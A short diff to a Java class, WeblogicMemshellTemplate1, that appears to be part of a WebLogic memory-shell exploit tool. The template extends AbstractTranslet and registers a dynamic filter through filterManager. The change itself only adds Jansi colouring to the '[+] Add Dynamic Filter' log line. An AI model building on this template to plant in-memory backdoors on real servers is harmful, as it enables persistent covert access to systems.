@@ -22,6 +22,8 @@ import java.util.HashSet;
 import java.util.Map;
 import java.util.Set;
 
+import static org.fusesource.jansi.Ansi.ansi;
+
 public class WeblogicMemshellTemplate1 extends AbstractTranslet {
     public WeblogicMemshellTemplate1(){
         try{
@@ -66,7 +68,7 @@ public class WeblogicMemshellTemplate1 extends AbstractTranslet {
 
                             // 判断一下，防止多次加载， 默认只加载一次，不需要重复加载
                             if (!filterManager.isFilterRegistered(filterName)) {
-                                System.out.println("[+] Add Dynamic Filter");
+                                System.out.println( ansi().render("@|green [+] Add Dynamic Filter|@"));
 
                                 ClassLoader cl = Thread.currentThread().getContextClassLoader();
                                 Class clazz;
